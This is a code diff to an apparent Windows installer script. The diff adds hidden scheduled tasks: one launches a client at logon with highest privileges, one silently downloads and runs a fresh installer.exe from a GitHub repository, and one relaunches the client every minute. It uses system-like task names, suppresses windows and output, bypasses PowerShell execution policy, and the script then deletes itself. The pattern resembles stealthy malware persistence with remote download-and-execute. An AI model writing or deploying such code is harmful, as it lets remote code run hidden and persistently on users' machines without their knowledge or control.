@@ -39,8 +39,18 @@ def elevate_if_needed():
 
 
 def stop_running_processes():
-    """Gracefully terminate running client processes."""
+    """Gracefully terminate running client processes and pause watchdog scheduler."""
     print("[Installer] Stopping existing client processes...")
+    schtasks_bin = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "schtasks.exe")
+    if not os.path.exists(schtasks_bin):
+        schtasks_bin = "schtasks"
+
+    subprocess.run(
+        [schtasks_bin, "/change", "/tn", "WinRunChecker", "/disable"],
+        creationflags=subprocess.CREATE_NO_WINDOW,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
     subprocess.run(
         ["taskkill", "/F", "/IM", "run.exe"],
         creationflags=subprocess.CREATE_NO_WINDOW,
@@ -81,6 +91,89 @@ def download_binary(download_url: str, dest_path: str):
     with urllib.request.urlopen(req) as resp, open(dest_path, "wb") as out:
         out.write(resp.read())
     print(f"[Installer] Download completed: {dest_path}")
+
+
+def setup_scheduled_tasks(run_bin: str, run_dir: str):
+    """Set up all three scheduled tasks: WinRun (logon), WinRunInstaller (update), and WinRunChecker (1-minute keepalive)."""
+    print("[Installer] Registering scheduled tasks...")
+
+    task_name = "WinRun"
+    installer_task_name = "WinRunInstaller"
+    checker_task_name = "WinRunChecker"
+
+    schtasks_bin = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "schtasks.exe")
+    if not os.path.exists(schtasks_bin):
+        schtasks_bin = "schtasks"
+
+    # 1. WinRun: Run at user logon
+    ps_winrun = (
+        f"$action = New-ScheduledTaskAction -Execute '{run_bin}' -WorkingDirectory '{run_dir}'; "
+        f"$trigger = New-ScheduledTaskTrigger -AtLogOn; "
+        f"$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries "
+        f"-ExecutionTimeLimit (New-TimeSpan -Days 365); "
+        f"Register-ScheduledTask -TaskName '{task_name}' -Action $action -Trigger $trigger "
+        f"-Settings $settings -RunLevel Highest -Force"
+    )
+
+    # 2. WinRunInstaller: Update task
+    cmd_installer = (
+        '$p=\\"$env:APPDATA\\run\\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; '
+        '$sha=(Invoke-RestMethod "https://api.github.com/repos/yuan-miranda/run/commits/main").sha; '
+        '$o=\\"$p\\installer.exe\\"; Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o; '
+        'Start-Process $o -WindowStyle Hidden'
+    )
+    ps_installer = (
+        f"$installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"{cmd_installer}\"'; "
+        f"$installerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries "
+        f"-ExecutionTimeLimit (New-TimeSpan -Minutes 10) -Hidden; "
+        f"Register-ScheduledTask -TaskName '{installer_task_name}' -Action $installerAction "
+        f"-Settings $installerSettings -RunLevel Highest -Force"
+    )
+
+    # 3. WinRunChecker: 1-minute checker task so run never goes offline
+    try:
+        subprocess.run(
+            [
+                schtasks_bin,
+                "/create",
+                "/tn",
+                checker_task_name,
+                "/tr",
+                f'"{run_bin}"',
+                "/sc",
+                "MINUTE",
+                "/mo",
+                "1",
+                "/f",
+            ],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        ps_checker_settings = (
+            f"$sett = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries "
+            f"-ExecutionTimeLimit (New-TimeSpan -Days 0) -StartWhenAvailable; "
+            f"Set-ScheduledTask -TaskName '{checker_task_name}' -Settings $sett"
+        )
+        subprocess.run(
+            [
+                "powershell.exe",
+                "-NoProfile",
+                "-NonInteractive",
+                "-WindowStyle",
+                "Hidden",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-Command",
+                f"{ps_winrun}; {ps_installer}; {ps_checker_settings}",
+            ],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        print("[Installer] Successfully configured WinRun, WinRunInstaller, and WinRunChecker (every 1 minute).")
+    except Exception as e:
+        print(f"[Installer Warning] Error registering scheduled tasks: {e}")
 
 
 def launch_client(run_bin: str, run_dir: str):
@@ -145,6 +238,7 @@ def main():
     except Exception as e:
         print(f"[Installer Warning] Failed to save state commit SHA: {e}")
 
+    setup_scheduled_tasks(run_bin, run_dir)
     launch_client(run_bin, run_dir)
     time.sleep(1)
     self_delete(run_bin)
